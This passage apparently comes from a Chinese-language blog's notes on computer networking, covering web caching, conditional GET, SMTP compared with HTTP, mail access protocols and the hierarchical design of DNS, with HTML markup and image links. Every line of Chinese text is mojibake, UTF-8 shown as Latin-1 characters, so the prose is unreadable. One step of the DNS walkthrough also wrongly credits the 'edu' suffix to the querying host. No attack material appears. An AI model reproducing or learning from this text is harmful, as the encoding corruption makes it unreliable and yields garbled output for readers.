<li>Webç¼“å­˜å™¨æ¥æ”¶åˆ°è¯¥å¯¹è±¡åï¼Œå®ƒåœ¨æœ¬åœ°å­˜å‚¨ç©ºé—´å­˜å‚¨ä¸€ä»½å‰¯æœ¬ï¼Œå¹¶å‘å®¢æˆ·çš„æµè§ˆå™¨å‘é€è¯¥å‰¯æœ¬çš„HTTPå“åº”æŠ¥æ–‡ã€‚</li>
</ol>
<p>:::danger no-icon</p>
<p>åœ¨ä¸Šè¿°æ­¥éª¤ä¸­ï¼ŒWebç¼“å­˜å™¨æ—¢æ˜¯å®¢æˆ·ï¼Œä¹Ÿæ˜¯æœåŠ¡å™¨ã€‚</p>
<p>:::</p>
<h3 id="æ¡ä»¶GETæ–¹æ³•"><a href="#æ¡ä»¶GETæ–¹æ³•" class="headerlink" title="æ¡ä»¶GETæ–¹æ³•"></a>æ¡ä»¶GETæ–¹æ³•</h3><p>å’Œæ™®é€šçš„GETæ–¹æ³•æœ‰ç‚¹åŒºåˆ«ï¼Œ<strong>æ¡ä»¶GETæ–¹æ³•ï¼ˆconditional GETï¼‰</strong>åœ¨åŸå…ˆGETæ–¹æ³•çš„åŸºç¡€ä¸ŠåŠ äº†ä¸€ä¸ªåŠŸèƒ½ï¼š==æ£€æŸ¥è¯¥å¯¹è±¡æ˜¯å¦æ˜¯æœ€æ–°çš„==</p>
<p>å¦‚æœä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡ä¸­ç”¨åˆ°äº†GETæ–¹æ³•ï¼Œå¹¶ä¸”è¯¥æŠ¥æ–‡çš„é¦–éƒ¨è¡Œè¿˜æœ‰åŒ…å«If-Modified-Sinceï¼Œé‚£ä¹ˆè¿™ä¸ªHTTPè¯·æ±‚æŠ¥æ–‡å°±æ˜¯ä¸€ä¸ªæ¡ä»¶GETè¯·æ±‚æŠ¥æ–‡ã€‚</p>
<p>æ‹¿ä¹¦ä¸Šçš„ä¾‹å­ç®€å•ä¸¾ä¾‹ï¼Œè¿™ä¸ªå€’å¹¶ä¸æ˜¯å¾ˆé‡è¦ï¼š</p>
<p>æŸä¸ªä»£ç†ç¼“å­˜å™¨ä»£è¡¨æŸä¸ªæµè§ˆå™¨å‘æŸä¸ªWebæœåŠ¡å™¨å‘é€äº†ä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409092203740.png" class="" title="image-20240409092203740">

<p>ç„¶åï¼ŒWebæœåŠ¡å™¨å‘é€äº†åŒ…å«è¯¥å¯¹è±¡çš„HTTPå“åº”æŠ¥æ–‡</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409092348120.png" class="" title="image-20240409092348120">

<p>å¯ä»¥çœ‹å‡ºï¼Œç¼“å­˜å™¨æ¥æ”¶äº†æŠ¥æ–‡ï¼Œä¹Ÿåœ¨æœ¬åœ°å­˜å‚¨äº†è¿™ä¸ªå¯¹è±¡ï¼ŒåŒæ—¶ä¹Ÿå­˜å‚¨äº†è¯¥å¯¹è±¡çš„æœ€åä¿®æ”¹æ—¥æœŸã€‚</p>
<p>ä¸€æ®µæ—¶é—´åï¼Œå¦ä¸€ä¸ªç”¨æˆ·å‘è¿™ä¸ªç¼“å­˜å™¨è¯·æ±‚åŒä¸€ä¸ªå¯¹è±¡ï¼Œç”±äºè¯¥å¯¹è±¡å¯èƒ½å·²ç»è¢«ä¿®æ”¹ï¼Œå› æ­¤åœ¨ç”¨æˆ·è¯·æ±‚åï¼Œè¯¥ç¼“å­˜å™¨ä¼šå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¡ä»¶GETè¯·æ±‚æ¥è¿›è¡Œæ£€æŸ¥ï¼š</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409093035321.png" class="" title="image-20240409093035321">

<p>å¦‚æœè¯¥å¯¹è±¡æ²¡æœ‰ä¿®æ”¹ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šå‘ç¼“å­˜å™¨å‘é€å¦‚ä¸‹å“åº”æŠ¥æ–‡ï¼š</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409093126679.png" class="" title="image-20240409093126679">

<p>æŠ¥æ–‡è¯´æ˜å¯¹è±¡æ²¡æœ‰ä¿®æ”¹ï¼Œç¼“å­˜å™¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¯¹è±¡ï¼Œæœ€åç¼“å­˜å™¨æŠŠè¿™ä¸ªå¯¹è±¡çš„å‰¯æœ¬å‘é€ç»™ç”¨æˆ·</p>
<h2 id="å› ç‰¹ç½‘ä¸­çš„ç”µå­é‚®ä»¶"><a href="#å› ç‰¹ç½‘ä¸­çš„ç”µå­é‚®ä»¶" class="headerlink" title="å› ç‰¹ç½‘ä¸­çš„ç”µå­é‚®ä»¶"></a>å› ç‰¹ç½‘ä¸­çš„ç”µå­é‚®ä»¶</h2><p>è¿™ä¸ªç®€å•è¯´è¯´å°±è¡Œï¼Œæ„Ÿè§‰ä¸å¤ªé‡è¦</p>
<p>å…ˆä¸Šä¸€ä¸ªå› ç‰¹ç½‘ç”µå­é‚®ä»¶ç³»ç»Ÿçš„æ€»ä½“æ¦‚å†µå›¾ï¼š</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409104905295.png" class="" title="image-20240409104905295">

<p>å¯ä»¥çœ‹åˆ°ï¼Œç”µå­é‚®ä»¶åˆ†ä¸ºä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ï¼š==ç”¨æˆ·ä»£ç†ï¼ˆuser agentï¼‰ï¼Œé‚®ä»¶æœåŠ¡å™¨ï¼ˆmail serverï¼‰ï¼Œç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼ˆSimple Mail Transfer Protocolï¼ŒSMTPï¼‰==ã€‚</p>
<h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>==SMTPæ˜¯å› ç‰¹ç½‘ç”µå­é‚®ä»¶ä¸­çš„ä¸»è¦åè®®==ã€‚å®ƒä½¿ç”¨TCPå¯é æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œä»å‘é€æ–¹çš„é‚®ä»¶æœåŠ¡å™¨å‘æ¥æ”¶æ–¹çš„é‚®ä»¶æœåŠ¡å™¨å‘é€é‚®ä»¶ã€‚</p>
<p>è·Ÿè®¸å¤šåº”ç”¨å±‚åè®®ä¸€æ ·ï¼ŒSMTPä¹Ÿæœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šè¿è¡Œåœ¨å‘é€æ–¹é‚®ä»¶æœåŠ¡å™¨çš„å®¢æˆ·ç«¯ï¼Œè¿è¡Œåœ¨æ¥æ”¶æ–¹æœåŠ¡å™¨çš„æœåŠ¡å™¨ç«¯ã€‚</p>
<p>ä¸Šä¸€ä¸ªå‘é€ç«¯å‘æ¥æ”¶ç«¯å‘é€ä¸€ä¸ªé‚®ä»¶çš„è¿‡ç¨‹å›¾ï¼š</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409110157180.png" class="" title="image-20240409110157180">

<ol>
<li>Aliceè°ƒç”¨é‚®ä»¶ä»£ç†ç¨‹åºå¹¶æä¾›Bobçš„é‚®ä»¶åœ°å€ï¼Œæ’°å†™æŠ¥æ–‡åæŒ‡ç¤ºä»£ç†å‘é€æŠ¥æ–‡ï¼›</li>
<li>Aliceç”¨æˆ·ä»£ç†å‘é€æŠ¥æ–‡åˆ°å¥¹çš„é‚®ä»¶æœåŠ¡å™¨ï¼ŒæŠ¥æ–‡è¢«æ”¾åœ¨æŠ¥æ–‡é˜Ÿåˆ—å½“ä¸­ï¼›</li>
<li>Aliceçš„é‚®ä»¶æœåŠ¡å™¨çš„SMTPå®¢æˆ·ç«¯å‘ç°äº†æŠ¥æ–‡é˜Ÿåˆ—ä¸­çš„è¿™ä¸ªæŠ¥æ–‡ï¼Œäºæ˜¯å°±åˆ›å»ºä¸€ä¸ªåˆ°Bobçš„é‚®ä»¶æœåŠ¡å™¨çš„SMTPæœåŠ¡å™¨çš„TCPè¿æ¥ï¼›</li>
<li>ç»è¿‡åˆå§‹çš„SMTPæ¡æ‰‹ä¹‹åï¼ŒSMTPå®¢æˆ·é€šè¿‡è¯¥TCPè¿æ¥å‘é€Aliceçš„æŠ¥æ–‡ï¼›</li>
<li>Bobçš„é‚®ä»¶æœåŠ¡å™¨ä¸Šçš„SMTPçš„æœåŠ¡å™¨æ¥æ”¶è¯¥æŠ¥æ–‡ï¼Œç„¶åè¯¥é‚®ä»¶æœåŠ¡å™¨å°†æŠ¥æ–‡æ”¾å…¥Bobçš„é‚®ç®±ä¸­ï¼›</li>
<li>Bobè°ƒç”¨ç”¨æˆ·ä»£ç†é˜…è¯»æŠ¥æ–‡</li>
</ol>
<p>:::info</p>
<p>å‡ ä¸ªæ³¨æ„çš„ç‚¹ï¼š</p>
<ol>
<li>SMTPä¸€èˆ¬ä¸ä½¿ç”¨ä¸­é—´é‚®ä»¶æœåŠ¡å™¨å‘é€é‚®ä»¶ï¼›</li>
<li>æ¥æ”¶ç«¯çš„é‚®ä»¶æœåŠ¡å™¨åœ¨æ²¡æœ‰è¿è¡Œçš„æƒ…å†µä¸‹ï¼Œå‘é€æŠ¥æ–‡ä¼šè¢«ä¿ç•™åœ¨å‘é€ç«¯å¹¶ç­‰å¾…è¿›è¡Œæ–°çš„å°è¯•ï¼Œä¸ä¼šåœ¨ä¸­é—´çš„æœåŠ¡å™¨åšåœç•™ã€‚</li>
</ol>
<p>:::</p>
<h3 id="ä¸HTTPçš„å¯¹æ¯”"><a href="#ä¸HTTPçš„å¯¹æ¯”" class="headerlink" title="ä¸HTTPçš„å¯¹æ¯”"></a>ä¸HTTPçš„å¯¹æ¯”</h3><h4 id="ç›¸åŒç‚¹"><a href="#ç›¸åŒç‚¹" class="headerlink" title="ç›¸åŒç‚¹"></a>ç›¸åŒç‚¹</h4><ol>
<li>HTTPå’ŒSMTPéƒ½æ˜¯ç”¨äºä»ä¸€å°ä¸»æœºå‘å¦ä¸€å°ä¸»æœºä¼ é€æ–‡ä»¶ï¼›</li>
<li><del>æŒç»­çš„HTTPå’ŒSMTPéƒ½ä½¿ç”¨æŒç»­è¿æ¥</del>ï¼ˆæ„Ÿè§‰åƒæ˜¯åºŸè¯â€¦â€¦ï¼‰</li>
</ol>
<h4 id="ä¸åŒç‚¹"><a href="#ä¸åŒç‚¹" class="headerlink" title="ä¸åŒç‚¹"></a>ä¸åŒç‚¹</h4><ol>
<li>HTTPç”¨äºä»WebæœåŠ¡å™¨å‘Webå®¢æˆ·ï¼ˆä¾‹å¦‚æµè§ˆå™¨ï¼‰ä¼ é€å¯¹è±¡ï¼ˆä¾‹å¦‚æ–‡ä»¶ï¼‰ï¼Œè€ŒSMTPç”¨äºä»ä¸€ä¸ªé‚®ä»¶æœåŠ¡å™¨å‘å¦ä¸€ä¸ªé‚®ä»¶æœåŠ¡å™¨ä¼ é€æ–‡ä»¶ï¼›</li>
<li>HTTPä¸»è¦æ˜¯ä¸€ç§<strong>æ‹‰åè®®ï¼ˆpull protocolï¼‰</strong>ï¼Œåœ¨æ–¹ä¾¿çš„æ—¶å€™ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨HTTPä»æŸä¸ªWebæœåŠ¡å™¨æ‹‰å–ä¸€äº›è¢«è£…è½½çš„ä¿¡æ¯ï¼›SMTPä¸»è¦æ˜¯ä¸€ç§<strong>æ¨åè®®ï¼ˆpush protocolï¼‰</strong>ï¼Œå‘é€é‚®ä»¶çš„æœåŠ¡å™¨æŠŠæ–‡ä»¶æ¨å‘æ¥æ”¶é‚®ä»¶çš„æœåŠ¡å™¨ï¼Œå½“äºŒè€…éœ€è¦å»ºç«‹TCPè¿æ¥æ—¶ï¼Œå‘é€é‚®ä»¶çš„æœåŠ¡å™¨å¿…é¡»ä¸ºå»ºç«‹è¿æ¥çš„å‘èµ·è€…ã€‚</li>
<li>SMTPè¦æ±‚æ¯ä¸ªæŠ¥æ–‡é‡‡ç”¨7æ¯”ç‰¹ASCIIç æ ¼å¼ï¼ŒHTTPåˆ™ä¸å—é™åˆ¶ï¼›</li>
<li>åœ¨å¤„ç†åŒ…å«æ–‡æœ¬å’Œå›¾å½¢çš„æ–‡æ¡£æ—¶ï¼ŒHTTPå°†æ¯ä¸ªå¯¹è±¡å°è£…åˆ°å¯¹åº”çš„ä¸åŒå“åº”æŠ¥æ–‡ä¸­ï¼ˆå°±æ˜¯ä¸€å¯¹ä¸€å°è£…ï¼‰ï¼ŒSMTPå°†æ‰€æœ‰çš„å¯¹è±¡æ”¾åœ¨ä¸€ä¸ªæŠ¥æ–‡ä¸­ã€‚</li>
</ol>
<h3 id="é‚®ä»¶æŠ¥æ–‡æ ¼å¼"><a href="#é‚®ä»¶æŠ¥æ–‡æ ¼å¼" class="headerlink" title="é‚®ä»¶æŠ¥æ–‡æ ¼å¼"></a>é‚®ä»¶æŠ¥æ–‡æ ¼å¼</h3><p>ä¸èµ˜è¿°ï¼Œçœ‹çœ‹å›¾å°±è¡Œ</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409115819761.png" class="" title="image-20240409115819761">

<p>Fromå’ŒToæ˜¯å¿…é¡»è¦æœ‰çš„</p>
<p>åé¢å¯èƒ½åªæœ‰ä¸€ä¸ªSubjecté¦–éƒ¨è¡Œï¼Œä¹Ÿå¯èƒ½æœ‰å…¶ä»–å¤šä¸ªå¯é€‰çš„é¦–éƒ¨è¡Œ</p>
<h3 id="é‚®ä»¶è®¿é—®åè®®"><a href="#é‚®ä»¶è®¿é—®åè®®" class="headerlink" title="é‚®ä»¶è®¿é—®åè®®"></a>é‚®ä»¶è®¿é—®åè®®</h3><p>ç›®å‰æµè¡Œçš„é‚®ä»¶è®¿é—®åè®®ï¼š<strong>ç¬¬ä¸‰ç‰ˆé‚®å±€åè®®ï¼ˆPost Office Protocolâ€“Version 3ï¼ŒPOP3ï¼‰</strong>ï¼Œ<strong>å› ç‰¹ç½‘é‚®ä»¶è®¿é—®åè®®ï¼ˆInternet Mail Access Protocolï¼ŒIMAPï¼‰</strong>ï¼Œ<strong>HTTP</strong></p>
<h2 id="DNSï¼šå› ç‰¹ç½‘çš„ç›®å½•æœåŠ¡"><a href="#DNSï¼šå› ç‰¹ç½‘çš„ç›®å½•æœåŠ¡" class="headerlink" title="DNSï¼šå› ç‰¹ç½‘çš„ç›®å½•æœåŠ¡"></a>DNSï¼šå› ç‰¹ç½‘çš„ç›®å½•æœåŠ¡</h2><h3 id="DNSæä¾›çš„æœåŠ¡"><a href="#DNSæä¾›çš„æœåŠ¡" class="headerlink" title="DNSæä¾›çš„æœåŠ¡"></a>DNSæä¾›çš„æœåŠ¡</h3><p>ä¸»æœºè¯†åˆ«æœ‰ä¸¤ç§æ–¹å¼ï¼šä¸»æœºåå’ŒIPåœ°å€ã€‚ç”¨æˆ·ä¸€èˆ¬åå¥½ä¸»æœºåï¼Œè€Œè·¯ç”±å™¨åˆ™åå¥½IPåœ°å€ã€‚ä¸ºäº†æŠ˜ä¸­ä¸¤ç§ä¸åŒçš„åå¥½ï¼ŒåŸŸåç³»ç»Ÿåº”è¿è€Œç”Ÿã€‚</p>
<p><strong>åŸŸåç³»ç»Ÿï¼ˆDomain Name Systemï¼ŒDNSï¼‰</strong>ï¼š==ä¸€ä¸ªç”±åˆ†å±‚çš„DNSæœåŠ¡å™¨å®ç°çš„åˆ†å¸ƒå¼æ•°æ®åº“å’Œä¸€ä¸ªä½¿å¾—ä¸»æœºèƒ½å¤ŸæŸ¥è¯¢åˆ†å¸ƒå¼æ•°æ®åº“çš„åº”ç”¨å±‚åè®®ã€‚==DNSåè®®è¿è¡Œåœ¨UDPä¹‹ä¸Šï¼Œä½¿ç”¨53ç«¯å£</p>
<p>ä»¥<code>http://www.example.com/path/to/sth</code>ä¸¾ä¾‹ï¼Œçœ‹çœ‹ç”¨æˆ·ä¸»æœºå¦‚ä½•è·å–URLçš„IPåœ°å€ï¼š</p>
<ol>
<li>æŸå°ç”¨æˆ·ä¸»æœºä¸Šè¿è¡Œç€DNSåº”ç”¨çš„å®¢æˆ·ç«¯ï¼›</li>
<li>æµè§ˆå™¨ä»è¯¥URLæŠ½å‡ºä¸»æœºå<code>www.example.com</code>ï¼Œå¹¶å°†å…¶ä¼ é€’ç»™DNSåº”ç”¨çš„å®¢æˆ·ç«¯ï¼›</li>
<li>DNSå®¢æˆ·å‘DNSæœåŠ¡å™¨å‘é€ä¸€ä¸ªåŒ…å«ä¸»æœºåçš„è¯·æ±‚ï¼›</li>
<li>DNSå®¢æˆ·æœ€ç»ˆæ”¶åˆ°ä¸€ä»½å›ç­”æŠ¥æ–‡ï¼ŒæŠ¥æ–‡åŒ…å«å¯¹åº”äºä¸»æœºåçš„IPåœ°å€ï¼›</li>
<li>æµè§ˆå™¨åœ¨æ¥æ”¶åˆ°æ¥è‡ªDNSçš„IPåœ°å€åï¼Œå°±å‘ä½äºè¯¥IPåœ°å€80ç«¯å£çš„HTTPæœåŠ¡å™¨è¿›ç¨‹å‘èµ·ä¸€ä¸ªTCPè¿æ¥</li>
</ol>
<p>é™¤äº†è¿›è¡Œä¸»æœºåå‘IPåœ°å€è½¬æ¢å¤–ï¼ŒDNSè¿˜æä¾›å…¶ä»–ä¸€äº›é‡è¦æœåŠ¡ï¼š</p>
<h4 id="ä¸»æœºåˆ«åï¼ˆhost-aliasingï¼‰"><a href="#ä¸»æœºåˆ«åï¼ˆhost-aliasingï¼‰" class="headerlink" title="ä¸»æœºåˆ«åï¼ˆhost aliasingï¼‰"></a>ä¸»æœºåˆ«åï¼ˆhost aliasingï¼‰</h4><p>æœ‰çš„ä¸»æœºåé•¿ä¸”å¤æ‚ï¼ŒåŸå…ˆçš„ä¸»æœºåå«<strong>è§„èŒƒä¸»æœºåï¼ˆcanonical hostnameï¼‰</strong>ã€‚ä¸ºäº†æ–¹ä¾¿è®°å¿†ï¼Œè¿™äº›ä¸»æœºéƒ½ä¼šæœ‰ä¸€ä¸ªæˆ–å¤šä¸ª<strong>ä¸»æœºåˆ«å</strong>ã€‚åº”ç”¨ç¨‹åºå¯ä»¥è°ƒç”¨DNSæ¥è·å¾—ä¸»æœºåˆ«åã€å¯¹åº”çš„è§„èŒƒä¸»æœºåå’ŒIPåœ°å€</p>
<h4 id="é‚®ä»¶æœåŠ¡å™¨åˆ«åï¼ˆmail-server-aliasingï¼‰"><a href="#é‚®ä»¶æœåŠ¡å™¨åˆ«åï¼ˆmail-server-aliasingï¼‰" class="headerlink" title="é‚®ä»¶æœåŠ¡å™¨åˆ«åï¼ˆmail server aliasingï¼‰"></a>é‚®ä»¶æœåŠ¡å™¨åˆ«åï¼ˆmail server aliasingï¼‰</h4><p>è·Ÿä¸»æœºåˆ«åå·®ä¸å¤šï¼Œä¸èµ˜è¿°ã€‚</p>
<h4 id="è´Ÿè½½åˆ†é…ï¼ˆload-distributionï¼‰"><a href="#è´Ÿè½½åˆ†é…ï¼ˆload-distributionï¼‰" class="headerlink" title="è´Ÿè½½åˆ†é…ï¼ˆload distributionï¼‰"></a>è´Ÿè½½åˆ†é…ï¼ˆload distributionï¼‰</h4><p>æ­¤æ—¶çš„DNSç”¨äºå†—ä½™çš„æœåŠ¡å™¨ä¹‹é—´çš„è´Ÿè½½åˆ†é…ã€‚æŸä¸ªç¹å¿™çš„ç«™ç‚¹è¢«åˆ†å¸ƒåœ¨å¤šå°æœåŠ¡å™¨ä¸Šï¼Œæ¯å°æœåŠ¡å™¨è¿è¡Œåœ¨ä¸åŒçš„ç«¯ç³»ç»Ÿä¸Šï¼Œæ¯ä¸ªç«¯ç³»ç»Ÿéƒ½æœ‰ä¸åŒçš„IPåœ°å€ã€‚è¿™äº›å†—ä½™çš„æœåŠ¡å™¨è®©ä¸€ä¸ªIPåœ°å€é›†åˆä¸åŒä¸€ä¸ªè§„èŒƒä¸»æœºåç›¸è”ç³»ï¼ŒåŒæ—¶DNSæ•°æ®åº“å­˜å‚¨ç€è¿™äº›IPåœ°å€çš„é›†åˆï¼Œå› æ­¤å½“å®¢æˆ·å¯¹æ˜ å°„åˆ°æŸåœ°å€é›†åˆçš„åå­—å‘å‡ºDNSè¯·æ±‚ï¼Œè¯¥æœåŠ¡å™¨å°±ç”¨IPåœ°å€çš„æ•´ä¸ªé›†åˆè¿›è¡Œå“åº”ï¼Œä¸è¿‡ä¸åŒIPä¹‹é—´åœ¨å“åº”æ—¶æ˜¯æœ‰é¡ºåºçš„ã€‚</p>
<h3 id="DNSå·¥ä½œæœºç†æ¦‚è¿°"><a href="#DNSå·¥ä½œæœºç†æ¦‚è¿°" class="headerlink" title="DNSå·¥ä½œæœºç†æ¦‚è¿°"></a>DNSå·¥ä½œæœºç†æ¦‚è¿°</h3><p>è¿™é‡Œå°±ç®€å•ç‚¹è¯´ï¼š</p>
<ol>
<li>ç”¨æˆ·ä¸»æœºçš„æŸåº”ç”¨ç¨‹åºéœ€è¦å°†ä¸»æœºåè½¬æ¢ä¸ºIPåœ°å€ï¼Œè°ƒç”¨DNSå®¢æˆ·ç«¯ï¼Œå¹¶æŒ‡æ˜éœ€è¦è¢«è½¬æ¢çš„ä¸»æœºåï¼›</li>
<li>ç”¨æˆ·ä¸»æœºçš„DNSæ¥æ”¶åå‘ç½‘ç»œå‘é€ä¸€ä¸ªDNSæŸ¥è¯¢æŠ¥æ–‡ï¼›</li>
<li>ç»è¿‡ä¸€æ®µæ—¶å»¶åï¼Œç”¨æˆ·ä¸»æœºä¸Šçš„DNSæ¥æ”¶åˆ°ä¸€ä¸ªæä¾›å¸Œæœ›æ˜ å°„çš„DNSå›ç­”æŠ¥æ–‡ï¼›</li>
<li>æ˜ å°„ç»“æœä¼ é€’åˆ°è°ƒç”¨DNSçš„åº”ç”¨ç¨‹åº</li>
</ol>
<p>:::warning</p>
<p>æ‰€æœ‰çš„DNSè¯·æ±‚å’Œå›ç­”æŠ¥æ–‡ä½¿ç”¨UDPæ•°æ®æŠ¥ç»è¿‡ç«¯å£53å‘é€</p>
<p>:::</p>
<h4 id="DNSçš„åˆ†å¸ƒå¼è®¾è®¡"><a href="#DNSçš„åˆ†å¸ƒå¼è®¾è®¡" class="headerlink" title="DNSçš„åˆ†å¸ƒå¼è®¾è®¡"></a>DNSçš„åˆ†å¸ƒå¼è®¾è®¡</h4><p>å•ä¸€çš„DNSæœåŠ¡å™¨è™½ç„¶ç®€å•ï¼Œä½†æ˜¯å‡ºç°çš„é—®é¢˜å¾ˆå¤šï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š</p>
<ol>
<li><strong>å•ç‚¹æ•…éšœï¼ˆa single point of failureï¼‰</strong>ï¼šå¦‚æœè¿™ä¸ªDNSæœåŠ¡å™¨å´©æºƒï¼Œé‚£ä¹ˆæ•´ä¸ªå› ç‰¹ç½‘å°±ä¼šå´©æºƒï¼›</li>
<li><strong>é€šä¿¡å®¹é‡ï¼ˆtraffic volumnï¼‰</strong>ï¼šå•ä¸ªDNSæœåŠ¡å™¨å¤„ç†ä¸Šäº¿ä¸ªDNSæŸ¥è¯¢æ˜¾ç„¶ä¸å¤Ÿï¼›</li>
<li><strong>è¿œè·ç¦»çš„é›†ä¸­å¼æ•°æ®åº“ï¼ˆdistant centralized databaseï¼‰</strong>ï¼šå•ä¸ªDNSæœåŠ¡å™¨æ˜¯ä¸å¯èƒ½ä½äºæ‰€æœ‰ç”¨æˆ·çš„é™„è¿‘ï¼Œè‹¥è·ç¦»è¾ƒè¿œçš„ç”¨æˆ·å‘DNSæœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šå› ä¸ºæ‹¥å¡å’Œä½é€Ÿçš„é“¾è·¯è€Œå¯¼è‡´å¾ˆå¤§çš„æ—¶å»¶ï¼›</li>
<li><strong>ç»´æŠ¤ï¼ˆmaintenanceï¼‰</strong>ï¼šå•ä¸ªDNSæœåŠ¡å¿…é¡»è¦ä¿ç•™æ‰€æœ‰çš„å› ç‰¹ç½‘ä¸»æœºçš„è®°å½•ï¼Œä¸ä»…ä¼šä½¿æ•°æ®åº“åºå¤§ï¼Œè¿˜éœ€è¦ä¸ºæ–°ä¸»æœºçš„åŠ å…¥é¢‘ç¹æ›´æ–°ã€‚</li>
</ol>
<p>å› æ­¤ï¼ŒDNSçš„åˆ†å¸ƒå¼è®¾è®¡åº”è¿è€Œç”Ÿã€‚</p>
<h5 id="åˆ†å¸ƒå¼ã€å±‚æ¬¡æ•°æ®åº“"><a href="#åˆ†å¸ƒå¼ã€å±‚æ¬¡æ•°æ®åº“" class="headerlink" title="åˆ†å¸ƒå¼ã€å±‚æ¬¡æ•°æ®åº“"></a>åˆ†å¸ƒå¼ã€å±‚æ¬¡æ•°æ®åº“</h5><p>ä¸ºäº†è§£å†³æ‰©å±•æ€§é—®é¢˜ï¼ŒDNSä½¿ç”¨äº†å¤§é‡çš„DNSæœåŠ¡å™¨ï¼Œä»¥å±‚æ¬¡æ–¹å¼ç»„ç»‡ï¼Œå¹¶ä¸”åˆ†å¸ƒåœ¨å…¨ä¸–ç•ŒèŒƒå›´å†…ã€‚</p>
<p>è¿™ç§æ–¹å¼ä¸€èˆ¬æœ‰3ç§DNSæœåŠ¡å™¨ï¼š==æ ¹DNSæœåŠ¡å™¨ï¼Œé¡¶çº§åŸŸï¼ˆTop-Level Domainï¼ŒTLDï¼‰DNSæœåŠ¡å™¨ï¼Œæƒå¨DNSæœåŠ¡å™¨ã€‚==</p>
<p>ä¸‹å›¾ä¸ºéƒ¨åˆ†DNSæœåŠ¡å™¨çš„å±‚æ¬¡ç»“æ„ï¼š</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409153556448.png" class="" title="image-20240409153556448">

<p>é™¤äº†ä»¥ä¸ŠæœåŠ¡å™¨ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç±»é‡è¦çš„DNSæœåŠ¡å™¨ç§°ä¸º<strong>æœ¬åœ°DNSæœåŠ¡å™¨ï¼ˆlocal DNS serverï¼‰</strong>ï¼Œè™½ç„¶å®ƒä¸å±äºå±‚æ¬¡ç»“æ„é‡Œé¢çš„ä»»ä½•æœåŠ¡å™¨ï¼Œä½†æ˜¯å¯¹å±‚æ¬¡ç»“æ„ååˆ†é‡è¦ã€‚</p>
<p>ä¸€å°ä¸»æœºå¦‚ä½•å¾—çŸ¥å¦ä¸€å°ä¸»æœºçš„IPåœ°å€å‘¢ï¼Ÿ</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼šï¼ˆè¯·æ±‚ä¸»æœºè®¾ä¸ºAï¼Œç›®æ ‡ä¸»æœºè®¾ä¸ºBï¼‰</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409154512745.png" class="" title="image-20240409154512745">

<ol>
<li>ä¸»æœºAå‘å®ƒçš„æœ¬åœ°DNSæœåŠ¡å™¨å‘é€ä¸€ä¸ªDNSæŸ¥è¯¢æŠ¥æ–‡ï¼ŒæŠ¥æ–‡åŒ…å«äº†è¢«è½¬æ¢çš„ä¸»æœºåBï¼›</li>
<li>æœ¬åœ°DNSæœåŠ¡å™¨å°†æŠ¥æ–‡è½¬å‘ç»™æ ¹DNSæœåŠ¡å™¨ï¼›</li>
<li>æ ¹DNSæœåŠ¡å™¨æ³¨æ„åˆ°ä¸»æœºAçš„eduå‰ç¼€ï¼Œç„¶åå‘æœ¬åœ°DNSæœåŠ¡å™¨è¿”å›è´Ÿè´£eduçš„TLDçš„IPåœ°å€åˆ—è¡¨ï¼›</li>
<li>æœ¬åœ°DNSæœåŠ¡å™¨å†æ¬¡å‘æŒ‡å®šçš„TLDæœåŠ¡å™¨ä¹‹ä¸€å‘é€æŠ¥æ–‡ï¼›</li>
<li>TLDæœåŠ¡å™¨æ³¨æ„åˆ°umass.eduçš„å‰ç¼€ï¼Œç”¨æƒå¨DNSæœåŠ¡å™¨çš„IPåœ°å€è¿›è¡Œå“åº”ï¼›</li>
<li>æœ¬åœ°DNSæœåŠ¡å™¨å‘æƒå¨DNSæœåŠ¡å™¨é‡æ–°å‘é€æŠ¥æ–‡ï¼›</li>
<li>æƒå¨DNSæœåŠ¡å™¨ç”¨ä¸»æœºBçš„IPåœ°å€è¿›è¡Œå“åº”ï¼›</li>
<li>æœ¬åœ°DNSæœåŠ¡å™¨è¿”å›ç»™ä¸»æœºAã€‚</li>
</ol>
<p>è¿™ä¸ªæ­¥éª¤ä¸­æ€»å…±å‘é€äº†8ç¯‡æŠ¥æ–‡ã€‚</p>
<p>:::info</p>
<p>ä¸Šè¿°ä¾‹å­åˆ©ç”¨äº†<strong>é€’å½’æŸ¥è¯¢ï¼ˆrecursive queryï¼‰</strong>å’Œ<strong>è¿­ä»£æŸ¥è¯¢ï¼ˆiterative queryï¼‰</strong>ã€‚</p>
<p>ä»ä¸»æœºåˆ°æœ¬åœ°DNSæœåŠ¡å™¨æ˜¯é€’å½’æŸ¥è¯¢ï¼Œå…¶ä½™çš„å‡ä¸ºè¿­ä»£æŸ¥è¯¢ï¼Œå› ä¸ºæ‰€æœ‰çš„å“åº”éƒ½æ˜¯è¿”å›ç»™æœ¬åœ°DNSæœåŠ¡å™¨çš„ã€‚</p>
<p>é€’å½’æŸ¥è¯¢çš„ä¾‹å­å¦‚ä¸‹å›¾ï¼š</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409160604713.png" class="" title="image-20240409160604713">

